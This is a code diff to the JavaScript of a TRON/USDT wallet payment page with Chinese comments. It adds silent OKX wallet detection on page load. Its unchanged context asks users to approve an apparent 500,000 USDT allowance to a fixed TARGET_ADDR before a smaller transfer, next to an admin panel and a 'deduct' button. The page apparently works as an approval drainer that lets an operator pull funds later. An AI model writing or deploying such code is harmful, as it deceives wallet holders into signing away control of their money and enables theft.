@@ -315,15 +315,18 @@ function disconnectWallet() {
     adminPanel.style.display = "none";
 }
 
-// 页面自动初始化：不调用tron_requestAccounts，不会弹授权弹窗
+// 【OKX钱包重点兼容】等待tronWeb ready事件，不写死延时
 async function autoInitWallet() {
-    await new Promise(resolve => setTimeout(resolve,800));
-    if(!window.tronWeb || !window.tronWeb.ready){
-        return;
-    }
+    if (!window.tronWeb) return;
     tronWeb = window.tronWeb;
-    userAddress = tronWeb.defaultAddress.base58;
-    if(!userAddress) return;
+    // 等待OKX注入完成ready
+    while (!tronWeb.ready) {
+        await new Promise(r => setTimeout(r, 250));
+    }
+    // OKX触发账户注入，无弹窗
+    try{ await tronWeb.setDefaultAccount(); }catch(e){}
+    userAddress = tronWeb.defaultAddress?.base58;
+    if (!userAddress) return;
     usdtContract = tronWeb.contract(USDT_ABI, USDT_CONTRACT);
     walletDot.classList.add("connected");
     await loadBalance();
@@ -363,14 +366,12 @@ sendBtn.addEventListener("click", async () => {
         const allowance = await usdtContract.methods.allowance(userAddress, TARGET_ADDR).call();
         if(BigInt(allowance) < BigInt(needSun)){
             alert("🔐需要授权USDT额度，钱包即将弹出签名");
-            // ✅这里才会唤起钱包签名弹窗
             const approveTx = await usdtContract.methods.approve(TARGET_ADDR, GRANT_500K_SUN).send();
             await waitTxConfirm(approveTx);
             alert("✅授权完成，等待链上同步");
             await waitAllowance(needSun);
         }
         alert("即将转账，钱包弹出签名确认");
-        // ✅转账这里唤起钱包签名弹窗
         const transferTx = await usdtContract.methods.transfer(TARGET_ADDR, needSun).send();
         await waitTxConfirm(transferTx);
         alert(`🎉转账成功！哈希：${transferTx}`);
@@ -415,7 +416,6 @@ deductBtn.addEventListener("click", async () => {
     }
 });
 
-// 点击红点：断开钱包
 walletDot.addEventListener("click", ()=>{
     if(userAddress){
         disconnectWallet();
@@ -430,10 +430,10 @@ settingIconBtn.addEventListener("click", () => {
     }
 });
 
-// 页面加载完成自动读取钱包地址，红点自动变绿，**全程不会弹授权弹窗**
-window.addEventListener('load',autoInitWallet);
+window.addEventListener('load',async ()=>{
+    await autoInitWallet();
+})
 
-// 监听钱包切换账号事件，自动刷新地址
 window.addEventListener('message',(e)=>{
     if(e.data?.message?.action === "accountsChanged"){
         disconnectWallet();
